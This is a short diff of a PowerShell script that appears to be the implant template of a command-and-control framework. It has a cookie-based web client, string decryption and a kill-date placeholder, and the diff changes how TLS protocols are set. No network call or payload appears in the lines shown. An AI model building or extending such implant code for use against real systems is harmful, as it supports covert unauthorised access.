@@ -49,7 +49,11 @@ function Decrypt-String ($key,$enc){
 }
 
 function Get-Webclient ($Cookie) {
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]192 -bor [Net.SecurityProtocolType]768 -bor [Net.SecurityProtocolType]3072;
+    try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12;
+    } catch {
+        echo "An error occurred: $_"
+    }
     $d = (Get-Date -Format "yyyy-MM-dd");
     $d = [datetime]::ParseExact($d,"yyyy-MM-dd",$null);
     $k = [datetime]::ParseExact("#REPLACEKILLDATE#","yyyy-MM-dd",$null);
